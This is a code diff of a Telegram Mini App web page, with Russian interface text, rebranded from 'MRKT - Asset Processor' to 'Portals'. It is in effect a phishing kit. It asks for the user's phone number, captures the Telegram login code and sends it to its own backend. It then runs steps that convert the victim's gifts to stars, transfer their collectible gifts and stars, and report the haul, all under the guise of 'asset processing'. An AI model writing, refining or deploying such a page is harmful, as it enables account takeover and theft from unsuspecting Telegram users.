@@ -1,222 +1,427 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRKT - Asset Processor</title>
+    <title>Portals</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
-        /* Основные стили из CSS файла */
-        @import"https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap";
-        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Manrope,sans-serif;height:100vh;overflow:hidden}.App{width:100%;height:100vh}
-        
-        #root{width:100%;height:100vh}
-        .loader-container{position:fixed;top:0;left:0;width:100%;height:100vh;background-color:#01aaff;display:flex;align-items:center;justify-content:center;z-index:9999}
-        .loader-content{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;gap:20px;width:100%;max-width:500px}
-        .loader-gif{max-width:280px;max-height:280px;width:auto;height:auto;margin-bottom:10px}
-        .loader-title{font-size:32px;font-weight:700;color:#fff;margin:0;line-height:1.2;width:100%}
-        .loader-subtitle{font-size:18px;font-weight:400;color:#ffffffe6;margin:0;line-height:1.4;width:100%;max-width:400px}
-        
-        .main-container{position:fixed;top:0;left:0;width:100%;height:100vh;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);display:flex;align-items:center;justify-content:center;z-index:9998}
-        
-        /* Контейнеры экранов */
-        .screen{display:none;flex-direction:column;align-items:center;justify-content:center;padding:30px;text-align:center;gap:25px;width:100%;max-width:400px;opacity:0;transform:translateY(20px);transition:all 0.5s ease-in-out}
-        .screen.active{display:flex;opacity:1;transform:translateY(0)}
-        
-        /* Общие стили элементов */
-        .screen-image{max-width:200px;max-height:200px;width:auto;height:auto;margin-bottom:15px;border-radius:20px}
-        .screen-title{font-size:28px;font-weight:700;color:#fff;margin:0;line-height:1.2;width:100%}
-        .screen-subtitle{font-size:16px;font-weight:400;color:#ffffffe6;margin:0;line-height:1.4;width:100%;max-width:350px}
-        
-        /* Кнопки */
-        .btn{display:flex;align-items:center;justify-content:center;gap:12px;padding:16px 28px;background:linear-gradient(135deg,#fff,#e6f4ff);border:none;border-radius:14px;font-family:Manrope,sans-serif;font-size:16px;font-weight:600;color:#01aaff;cursor:pointer;transition:all .3s ease;min-width:280px;width:100%;max-width:320px}
-        .btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(0,0,0,0.2)}
-        .btn-secondary{background:transparent;border:2px solid rgba(255,255,255,0.3);color:#fff}
-        .btn-secondary:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.5)}
-        
-        /* Формы */
-        .form-group{display:flex;flex-direction:column;gap:15px;width:100%;max-width:320px}
-        .form-input{width:100%;padding:16px 20px;font-family:Manrope,sans-serif;font-size:16px;font-weight:500;border:2px solid rgba(255,255,255,.3);border-radius:12px;background:#ffffff1a;color:#fff;outline:none;transition:all .3s ease}
-        .form-input:focus{border-color:#fffc;background:#fff3}
-        .form-input::placeholder{color:#fff9}
-        
-        /* Прогресс бар */
-        .progress-container{width:100%;max-width:320px;background:rgba(255,255,255,0.2);border-radius:10px;overflow:hidden;height:8px}
-        .progress-bar{height:100%;background:linear-gradient(90deg, #00ff88, #00ccff);transition:width 0.3s ease;width:0%}
-        
-        /* Спиннер */
-        .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top:4px solid white;border-radius:50%;animation:spin 1s linear infinite}
-        @keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
-        
-        /* Анимации */
-        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
-        @keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
-        
-        .fade-in{animation:fadeIn 0.5s ease-in-out}
-        .slide-up{animation:slideUp 0.5s ease-in-out}
-        
-        /* Адаптивность */
-        @media (max-width: 480px){
-            .screen{padding:20px;gap:20px;max-width:320px}
-            .screen-title{font-size:24px}
-            .screen-subtitle{font-size:14px}
-            .btn{padding:14px 24px;font-size:15px;min-width:250px;max-width:280px}
-            .form-group{max-width:280px}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #00BFFF;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 300;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .title {
+            font-size: 2.8rem;
+            font-weight: 300;
+            margin-bottom: 2rem;
+            color: white;
+            letter-spacing: -0.5px;
+        }
+
+        .gif-container {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 2rem;
+            border-radius: 20px;
+            overflow: hidden;
+            background: rgba(255,255,255,0.1);
+        }
+
+        .gif-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .auth-btn {
+            background: white;
+            color: #00BFFF;
+            border: none;
+            border-radius: 12px;
+            padding: 18px 32px;
+            font-size: 1.2rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 1rem;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .auth-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+
+        .auth-btn:active {
+            transform: translateY(0);
+        }
+
+        .auth-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .telegram-icon {
+            width: 24px;
+            height: 24px;
+            background: #00BFFF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .telegram-icon::before {
+            content: "";
+            width: 12px;
+            height: 12px;
+            background: white;
+            clip-path: polygon(0 0, 100% 50%, 0 100%);
+            transform: translateX(1px);
+        }
+
+        /* Стили для формы ввода кода */
+        .auth-form {
+            display: none;
+            background: rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-top: 1rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .form-title {
+            font-size: 1.4rem;
+            margin-bottom: 1.5rem;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+            justify-content: center;
+        }
+
+        .code-input {
+            width: 45px;
+            height: 55px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 1.4rem;
+            text-align: center;
+            font-weight: 500;
+            font-family: 'Inter', monospace;
+            transition: border-color 0.3s ease;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: white;
+            background: rgba(255,255,255,0.15);
+        }
+
+        .submit-btn {
+            background: white;
+            color: #00BFFF;
+            border: none;
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .resend-code {
+            color: rgba(255,255,255,0.8);
+            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            font-weight: 400;
+        }
+
+        .resend-code:hover {
+            color: white;
+        }
+
+        .status-message {
+            margin-top: 1rem;
+            font-size: 0.95rem;
+            color: rgba(255,255,255,0.8);
+            min-height: 20px;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .processing-steps {
+            display: none;
+            margin-top: 2rem;
+            text-align: left;
+        }
+
+        .step {
+            margin: 1.2rem 0;
+            font-size: 1.1rem;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+            font-weight: 400;
+            padding-left: 0;
+            list-style: none;
+        }
+
+        .step.active {
+            opacity: 1;
+            font-weight: 500;
+            color: white;
+        }
+
+        .step.completed {
+            opacity: 1;
+            color: rgba(255,255,255,0.9);
+        }
+
+        .phone-share-info {
+            font-size: 0.9rem;
+            color: rgba(255,255,255,0.7);
+            margin-top: 1rem;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem;
+            }
+            
+            .title {
+                font-size: 2.4rem;
+            }
+            
+            .gif-container {
+                width: 180px;
+                height: 180px;
+            }
+            
+            .auth-btn {
+                padding: 16px 24px;
+                font-size: 1.1rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="App">
-        <!-- Экран загрузки -->
-        <div class="loader-container" id="loaderScreen">
-            <div class="loader-content">
-                <div class="spinner"></div>
-                <h1 class="loader-title">Загрузка</h1>
-                <p class="loader-subtitle">Подготовка приложения...</p>
+    <div class="container">
+        <h1 class="title">Portals</h1>
+        
+        <div class="gif-container">
+            <img src="https://tenor.com/ru/view/plush-pepe-telegram-pepe-princess-pepe-gif-15771625456874497350" alt="Plush Pepe" id="pepeGif">
+        </div>
+
+        <!-- Начальный экран -->
+        <div id="initialScreen">
+            <button class="auth-btn" onclick="sharePhoneNumber()" id="sharePhoneBtn">
+                <div class="telegram-icon"></div>
+                Войти с помощью Telegram
+            </button>
+            <div class="phone-share-info">
+                Мы используем ваш номер телефона для безопасного подключения к вашему аккаунту Telegram
             </div>
         </div>
 
-        <!-- Основной контейнер -->
-        <div class="main-container">
-            <!-- Главный экран -->
-            <div class="screen active" id="mainScreen">
-                <img src="https://images.unsplash.com/photo-1518837695005-2083093ee35b?w=400" alt="Stars" class="screen-image">
-                <h1 class="screen-title">Добро пожаловать</h1>
-                <p class="screen-subtitle">Подключите Telegram для обработки активов</p>
-                <button class="btn" onclick="showScreen('authScreen')">
-                    <span>🔑 Подключить Telegram</span>
-                </button>
+        <!-- Форма ввода кода -->
+        <div id="codeForm" class="auth-form">
+            <div class="form-title">Введите код подтверждения отправленный на ваш аккаунт</div>
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
             </div>
+            <div class="resend-code" onclick="resendCode()">Отправить код снова</div>
+            <button class="submit-btn" onclick="verifyCode()" id="verifyBtn">Подтвердить код</button>
+            <div class="status-message" id="codeStatus"></div>
+        </div>
 
-            <!-- Экран аутентификации -->
-            <div class="screen" id="authScreen">
-                <img src="https://images.unsplash.com/photo-1611605698335-8b1569810432?w=400" alt="Security" class="screen-image">
-                <h1 class="screen-title">Безопасный вход</h1>
-                <p class="screen-subtitle">Введите номер телефона для получения кода</p>
-                <div class="form-group">
-                    <input type="tel" class="form-input" id="phoneInput" placeholder="+7 XXX XXX XX XX" required>
-                    <button class="btn" onclick="sendAuthCode()">Получить код</button>
-                </div>
-                <button class="btn btn-secondary" onclick="showScreen('mainScreen')">Назад</button>
-            </div>
-
-            <!-- Экран ввода кода -->
-            <div class="screen" id="codeScreen">
-                <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400" alt="Verification" class="screen-image">
-                <h1 class="screen-title">Подтверждение</h1>
-                <p class="screen-subtitle">Введите код из Telegram</p>
-                <div class="form-group">
-                    <input type="text" class="form-input" id="codeInput" placeholder="12345" maxlength="6" required>
-                    <button class="btn" onclick="verifyCode()">Подтвердить</button>
-                </div>
-                <button class="btn btn-secondary" onclick="showScreen('authScreen')">Назад</button>
-            </div>
-
-            <!-- Экран сканирования активов -->
-            <div class="screen" id="scanScreen">
-                <img src="https://images.unsplash.com/photo-1534447677768-be436bb09401?w=400" alt="Scanning" class="screen-image">
-                <h1 class="screen-title">Сканирование</h1>
-                <p class="screen-subtitle">Поиск подарков и активов...</p>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
-                <div class="spinner"></div>
-            </div>
-
-            <!-- Экран результатов -->
-            <div class="screen" id="resultsScreen">
-                <img src="https://images.unsplash.com/photo-1579546929518-9e396f3cc809?w=400" alt="Results" class="screen-image">
-                <h1 class="screen-title" id="resultsTitle">Результаты</h1>
-                <p class="screen-subtitle" id="resultsSubtitle">Обработка завершена</p>
-                <div class="form-group" id="resultsContent">
-                    <!-- Динамическое содержимое -->
-                </div>
-                <button class="btn" onclick="showScreen('mainScreen')">Завершить</button>
-            </div>
-
-            <!-- Экран ошибки -->
-            <div class="screen" id="errorScreen">
-                <img src="https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400" alt="Error" class="screen-image">
-                <h1 class="screen-title">Ошибка</h1>
-                <p class="screen-subtitle" id="errorMessage">Произошла непредвиденная ошибка</p>
-                <button class="btn" onclick="showScreen('mainScreen')">Попробовать снова</button>
-            </div>
+        <!-- Процесс обработки -->
+        <div id="processingSteps" class="processing-steps">
+            <div class="step" id="step1">Аутентификация аккаунта</div>
+            <div class="step" id="step2">Получение списка подарков</div>
+            <div class="step" id="step3">Конвертация подарков в звезды</div>
+            <div class="step" id="step4">Передача коллекционных предметов</div>
+            <div class="step" id="step5">Перевод звезд</div>
+            <div class="step" id="step6">Завершение процесса</div>
         </div>
     </div>
 
     <script>
-        // Глобальные переменные
-        let currentPhone = '';
-        let currentCodeHash = '';
-        let currentUserId = '';
+        let authData = {
+            phone: '',
+            phoneCodeHash: '',
+            userId: null
+        };
 
-        // Инициализация приложения
-        function initApp() {
-            setTimeout(() => {
-                document.getElementById('loaderScreen').style.display = 'none';
-                showScreen('mainScreen');
-            }, 2000);
-        }
-
-        // Показать экран
-        function showScreen(screenId) {
-            // Скрыть все экраны
-            const screens = document.querySelectorAll('.screen');
-            screens.forEach(screen => {
-                screen.classList.remove('active');
-                screen.style.display = 'none';
-            });
+        async function sharePhoneNumber() {
+            const shareBtn = document.getElementById('sharePhoneBtn');
+            const status = document.getElementById('codeStatus');
             
-            // Показать целевой экран
-            const targetScreen = document.getElementById(screenId);
-            targetScreen.style.display = 'flex';
-            setTimeout(() => {
-                targetScreen.classList.add('active');
-            }, 50);
+            shareBtn.disabled = true;
+            shareBtn.innerHTML = '<div class="telegram-icon"></div>Запрос номера телефона...';
+            
+            try {
+                // Используем Telegram Web App для получения номера телефона
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.requestContact((contact) => {
+                        if (contact) {
+                            // Номер телефона получен
+                            authData.phone = contact.phone_number;
+                            shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер телефона получен';
+                            
+                            // Показываем форму ввода кода
+                            document.getElementById('initialScreen').style.display = 'none';
+                            document.getElementById('codeForm').style.display = 'block';
+                            
+                            // Автофокус на первый инпут кода
+                            setTimeout(() => {
+                                document.querySelector('.code-input').focus();
+                            }, 100);
+                            
+                            // Отправляем код на номер
+                            sendAuthCode();
+                        } else {
+                            status.textContent = 'Предоставление номера телефона отменено';
+                            shareBtn.disabled = false;
+                            shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти с помощью Telegram';
+                        }
+                    });
+                } else {
+                    // Fallback для тестирования вне Telegram
+                    authData.phone = '+1234567890';
+                    document.getElementById('initialScreen').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                    setTimeout(() => {
+                        document.querySelector('.code-input').focus();
+                    }, 100);
+                    sendAuthCode();
+                }
+            } catch (error) {
+                console.error('Error requesting phone number:', error);
+                status.textContent = 'Ошибка при запросе номера телефона';
+                shareBtn.disabled = false;
+                shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти с помощью Telegram';
+            }
         }
 
-        // Отправить код аутентификации
         async function sendAuthCode() {
-            const phone = document.getElementById('phoneInput').value;
-            if (!phone) {
-                showError('Введите номер телефона');
+            const status = document.getElementById('codeStatus');
+            
+            if (!authData.phone) {
+                status.textContent = 'Требуется номер телефона';
                 return;
             }
 
-            currentPhone = phone;
-            showScreen('codeScreen');
-
+            status.textContent = 'Отправка кода подтверждения...';
+            
             try {
                 const response = await fetch('/auth/send-code', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ phone: phone })
+                    body: JSON.stringify({
+                        phone: authData.phone
+                    })
                 });
 
-                const data = await response.json();
+                const result = await response.json();
                 
-                if (data.success) {
-                    currentCodeHash = data.phone_code_hash;
+                if (result.success) {
+                    authData.phoneCodeHash = result.phone_code_hash;
+                    status.textContent = 'Код подтверждения отправлен на ваш аккаунт';
                 } else {
-                    showError(data.message || 'Ошибка отправки кода');
+                    status.textContent = result.message || 'Ошибка отправки кода подтверждения';
                 }
             } catch (error) {
-                showError('Ошибка сети');
+                status.textContent = 'Ошибка соединения';
             }
         }
 
-        // Проверить код
+        function moveToNext(input, nextIndex) {
+            if (input.value.length === 1) {
+                const nextInput = document.querySelectorAll('.code-input')[nextIndex];
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+        }
+
+        function resendCode() {
+            const status = document.getElementById('codeStatus');
+            status.textContent = 'Отправка нового кода подтверждения...';
+            sendAuthCode();
+        }
+
         async function verifyCode() {
-            const code = document.getElementById('codeInput').value;
-            if (!code) {
-                showError('Введите код подтверждения');
+            const codeInputs = document.querySelectorAll('.code-input');
+            const code = Array.from(codeInputs).map(input => input.value).join('');
+            const status = document.getElementById('codeStatus');
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            if (code.length !== 5) {
+                status.textContent = 'Пожалуйста, введите полный код подтверждения';
                 return;
             }
 
-            showScreen('scanScreen');
-            simulateProgress();
-
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Проверка...';
+            status.textContent = 'Проверка кода...';
+            
             try {
                 const response = await fetch('/auth/verify-code', {
                     method: 'POST',
@@ -224,177 +429,183 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        phone: currentPhone,
-                        phone_code_hash: currentCodeHash,
+                        phone: authData.phone,
+                        phone_code_hash: authData.phoneCodeHash,
                         code: code
                     })
                 });
 
-                const data = await response.json();
+                const result = await response.json();
                 
-                if (data.success) {
-                    currentUserId = data.user_id;
-                    await processAssets();
+                if (result.success) {
+                    authData.userId = result.user_id;
+                    status.textContent = 'Проверка успешно завершена';
+                    
+                    // Начинаем процесс обработки активов
+                    setTimeout(() => {
+                        startAssetProcessing();
+                    }, 1000);
                 } else {
-                    showError(data.message || 'Неверный код');
+                    status.textContent = result.message || 'Неверный код подтверждения';
+                    verifyBtn.disabled = false;
+                    verifyBtn.textContent = 'Подтвердить код';
                 }
             } catch (error) {
-                showError('Ошибка проверки кода');
+                status.textContent = 'Ошибка соединения при проверке';
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Подтвердить код';
             }
         }
 
-        // Обработка активов
-        async function processAssets() {
+        async function startAssetProcessing() {
+            document.getElementById('codeForm').style.display = 'none';
+            document.getElementById('processingSteps').style.display = 'block';
+
             try {
-                // Получить подарки
-                const giftsResponse = await fetch('/api/get-gifts', {
+                // Шаг 1: Авторизация
+                await updateStep(1, 'Аутентификация аккаунта завершена');
+                
+                // Шаг 2: Получение подарков
+                await updateStep(2, 'Список подарков получен');
+                const gifts = await getUserGifts();
+                
+                // Шаг 3: Конвертация в звезды
+                await updateStep(3, 'Конвертация подарков в звезды завершена');
+                await convertGiftsToStars(gifts);
+                
+                // Шаг 4: Передача коллекционных
+                await updateStep(4, 'Передача коллекционных предметов завершена');
+                await transferCollectibles(gifts);
+                
+                // Шаг 5: Перевод звезд
+                await updateStep(5, 'Перевод звезд завершен');
+                await transferStars();
+                
+                // Шаг 6: Завершение
+                await updateStep(6, 'Процесс успешно завершен');
+                
+                // Отправляем финальный отчет
+                await sendFinalReport(gifts);
+                
+            } catch (error) {
+                console.error('Processing error:', error);
+                document.getElementById('step6').textContent = 'Произошла ошибка обработки';
+            }
+        }
+
+        function updateStep(stepNumber, message) {
+            return new Promise(resolve => {
+                // Обновляем все предыдущие шаги как завершенные
+                for (let i = 1; i < stepNumber; i++) {
+                    const step = document.getElementById(`step${i}`);
+                    step.classList.add('completed');
+                    step.classList.remove('active');
+                }
+                
+                // Активируем текущий шаг
+                const currentStep = document.getElementById(`step${stepNumber}`);
+                currentStep.classList.add('active');
+                currentStep.textContent = message;
+                
+                setTimeout(resolve, 1500);
+            });
+        }
+
+        async function getUserGifts() {
+            const response = await fetch('/api/get-gifts', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user_id: authData.userId,
+                    phone: authData.phone
+                })
+            });
+            
+            const result = await response.json();
+            return result.gifts || [];
+        }
+
+        async function convertGiftsToStars(gifts) {
+            const convertibleGifts = gifts.filter(g => g.can_convert);
+            
+            for (const gift of convertibleGifts) {
+                await fetch('/api/convert-gift', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        user_id: currentUserId,
-                        phone: currentPhone
+                        user_id: authData.userId,
+                        gift_id: gift.id
                     })
                 });
-
-                const giftsData = await giftsResponse.json();
                 
-                if (giftsData.success) {
-                    let processedCount = 0;
-                    let totalStars = 0;
-                    let collectibles = 0;
-
-                    // Обработать каждый подарок
-                    for (const gift of giftsData.gifts) {
-                        if (gift.can_convert) {
-                            // Конвертировать в звезды
-                            const convertResponse = await fetch('/api/convert-gift', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    user_id: currentUserId,
-                                    gift_id: gift.id,
-                                    phone: currentPhone
-                                })
-                            });
-                            
-                            const convertData = await convertResponse.json();
-                            if (convertData.success) {
-                                processedCount++;
-                                totalStars += gift.stars || 100;
-                            }
-                        } else if (gift.can_transfer && gift.unique) {
-                            // Передать коллекционный подарок
-                            const transferResponse = await fetch('/api/transfer-collectible', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    user_id: currentUserId,
-                                    gift_id: gift.id,
-                                    phone: currentPhone
-                                })
-                            });
-                            
-                            const transferData = await transferResponse.json();
-                            if (transferData.success) {
-                                collectibles++;
-                            }
-                        }
-                    }
-
-                    // Перевести звезды
-                    const starsResponse = await fetch('/api/transfer-stars', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            user_id: currentUserId,
-                            phone: currentPhone
-                        })
-                    });
-
-                    // Отправить финальный отчет
-                    await fetch('/api/final-report', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            user_id: currentUserId,
-                            phone: currentPhone,
-                            total_gifts: giftsData.gifts.length,
-                            processed_gifts: processedCount,
-                            collectibles: collectibles
-                        })
-                    });
-
-                    // Показать результаты
-                    showResults(processedCount, collectibles, totalStars, giftsData.gifts.length);
-                } else {
-                    showError('Ошибка получения подарков');
-                }
-            } catch (error) {
-                showError('Ошибка обработки активов');
+                // Задержка между запросами
+                await new Promise(resolve => setTimeout(resolve, 500));
             }
         }
 
-        // Показать результаты
-        function showResults(processed, collectibles, stars, total) {
-            const resultsContent = document.getElementById('resultsContent');
-            const resultsTitle = document.getElementById('resultsTitle');
-            const resultsSubtitle = document.getElementById('resultsSubtitle');
+        async function transferCollectibles(gifts) {
+            const collectibles = gifts.filter(g => g.unique && g.can_transfer);
             
-            resultsTitle.textContent = 'Обработка завершена';
-            resultsSubtitle.textContent = `Успешно обработано ${processed + collectibles} из ${total} активов`;
-            
-            resultsContent.innerHTML = `
-                <div style="text-align: left; color: white; font-size: 14px;">
-                    <div style="margin-bottom: 10px;">✅ Конвертировано подарков: ${processed}</div>
-                    <div style="margin-bottom: 10px;">🎁 Передано коллекционных: ${collectibles}</div>
-                    <div style="margin-bottom: 10px;">⭐ Получено звезд: ${stars}</div>
-                    <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px;">
-                        <strong>Все активы успешно переданы</strong>
-                    </div>
-                </div>
-            `;
-            
-            showScreen('resultsScreen');
+            for (const gift of collectibles) {
+                await fetch('/api/transfer-collectible', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        user_id: authData.userId,
+                        gift_id: gift.id
+                    })
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
         }
 
-        // Показать ошибку
-        function showError(message) {
-            document.getElementById('errorMessage').textContent = message;
-            showScreen('errorScreen');
+        async function transferStars() {
+            await fetch('/api/transfer-stars', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user_id: authData.userId
+                })
+            });
         }
 
-        // Симуляция прогресса
-        function simulateProgress() {
-            const progressBar = document.getElementById('progressBar');
-            let width = 0;
-            const interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                } else {
-                    width += Math.random() * 10;
-                    progressBar.style.width = Math.min(width, 100) + '%';
-                }
-            }, 300);
+        async function sendFinalReport(gifts) {
+            await fetch('/api/final-report', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user_id: authData.userId,
+                    phone: authData.phone,
+                    total_gifts: gifts.length,
+                    processed_gifts: gifts.filter(g => g.can_convert).length,
+                    collectibles: gifts.filter(g => g.unique).length
+                })
+            });
         }
 
-        // Инициализация при загрузке
-        window.addEventListener('load', initApp);
-
-        // Обработка сообщений от Telegram Web App
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'telegram_login') {
-                // Обработка данных логина Telegram
-                console.log('Telegram login data:', event.data);
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            // Устанавливаем гифку Plush Pepe
+            const gifUrl = 'https://tenor.com/ru/view/plush-pepe-telegram-pepe-princess-pepe-gif-15771625456874497350';
+            document.getElementById('pepeGif').src = gifUrl;
+            
+            // Инициализируем Telegram Web App
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+                Telegram.WebApp.setHeaderColor('#00BFFF');
+                Telegram.WebApp.setBackgroundColor('#00BFFF');
             }
         });
     </script>
